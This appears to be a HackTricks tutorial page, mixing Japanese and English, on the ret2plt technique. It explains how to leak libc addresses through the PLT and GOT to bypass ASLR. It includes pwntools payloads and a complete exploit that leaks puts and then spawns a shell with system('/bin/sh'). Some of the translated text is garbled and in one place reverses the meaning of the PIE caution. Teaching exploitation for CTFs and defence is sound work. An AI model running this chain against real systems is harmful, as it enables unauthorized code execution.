# Ret2plt

{{#include ../../../banners/hacktricks-training.md}}

## 基本情報

この手法の目的は、**PLTの関数からアドレスをleakする**ことでASLRを回避可能にすることです。 例えば、libcの関数`puts`のアドレスをleakすれば、**`libc`のベースアドレスがどこにあるかを算出**し、**`system`**など他の関数にアクセスするためのオフセットを計算できます。

これは例えば`pwntools`のペイロードで実行できます（[**from here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)）：
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
Note how **`puts`** (using the address from the PLT) is called with the address of `puts` located in the GOT (Global Offset Table). This is because by the time `puts` prints the GOT entry of puts, this **entry will contain the exact address of `puts` in memory**.

これは、PLT のアドレスを使う **`puts`** が GOT (Global Offset Table) にある `puts` のアドレスを渡して呼ばれている点に注意してください。これは、`puts` が GOT エントリを出力する時点では、その**エントリがメモリ上の `puts` の正確なアドレスを含んでいる**ためです。

Also note how the address of `main` is used in the exploit so when `puts` ends its execution, the **binary calls `main` again instead of exiting** (so the leaked address will continue to be valid).

また、エクスプロイトで `main` のアドレスが使用されているため、`puts` の実行が終わったときに**binary は終了せずに `main` を再び呼ぶ**（so the leaked address will continue to be valid）点にも注意してください。

> [!CAUTION]
> Note how in order for this to work the **binary cannot be compiled with PIE** or you must have **found a leak to bypass PIE** in order to know the address of the PLT, GOT and main. Otherwise, you need to bypass PIE first.

> [!CAUTION]
> これが機能するためには、**binary cannot be compiled with PIE** であってはならないか、PLT、GOT、main のアドレスを知るために **found a leak to bypass PIE** を持っている必要がある点に注意してください。さもなければ、まず PIE をバイパスする必要があります。

You can find a [**full example of this bypass here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). This was the final exploit from that **example**:

このバイパスの[**完全な例はこちら**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass)で見ることができます。以下はその**例**からの最終的なエクスプロイトです：

<details>
<summary>完全なエクスプロイト例 (ret2plt leak + system)</summary>
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
</details>

## Modern considerations

- **`-fno-plt` builds** (common in modern distros) replace `call foo@plt` with `call [foo@got]`. If the binary has no `foo@plt` stub, you can still leak the resolved address with `puts(elf.got['foo'])` and then **return directly to the GOT entry** (`flat(padding, elf.got['foo'])`) to jump into libc once lazy binding has completed.
- **Full RELRO / `-Wl,-z,now`**: GOT is read‑only but ret2plt still works for leaks because you only read the GOT slot. If the symbol was never called, your first ret2plt will also perform lazy binding and then print the resolved slot.
- **ASLR + PIE**: if PIE is enabled, first leak a code pointer (e.g., 保存された戻りアドレス, 関数ポインタ, または別の format‑string/infoleak を使った `.plt` エントリ) で PIE ベースを算出し、その後リベースされた PLT/GOT アドレスで ret2plt チェーンを構築します。
- **Non‑x86 architectures with BTI/PAC (AArch64)**: PLT entries are valid BTI landing pads (`bti c`), so when exploiting on BTI‑enabled binaries prefer jumping into the PLT stub (or another BTI‑annotated gadget) instead of directly into a libc gadget without BTI, otherwise the CPU will raise `BRK`/`PAC` failures.
- **Quick resolution helper**: if the target function is not yet resolved and you need a leak in a single shot, chain the PLT call twice: first `elf.plt['foo']` (to resolve) then again `elf.plt['foo']` with the GOT address as argument to print the now‑filled slot.

## Other examples & References

- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bit, ASLR enabled but no PIE, the first step is to fill an overflow until the byte 0x00 of the canary to then call puts and leak it. With the canary a ROP gadget is created to call puts to leak the address of puts from the GOT and the a ROP gadget to call `system('/bin/sh')`
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bits, ASLR enabled, no canary, stack overflow in main from a child function. ROP gadget to call puts to leak the address of puts from the GOT and then call an one gadget.

## References

- [MaskRay – All about Procedure Linkage Table](https://maskray.me/blog/2021-09-19-all-about-procedure-linkage-table)

{{#include ../../../banners/hacktricks-training.md}}
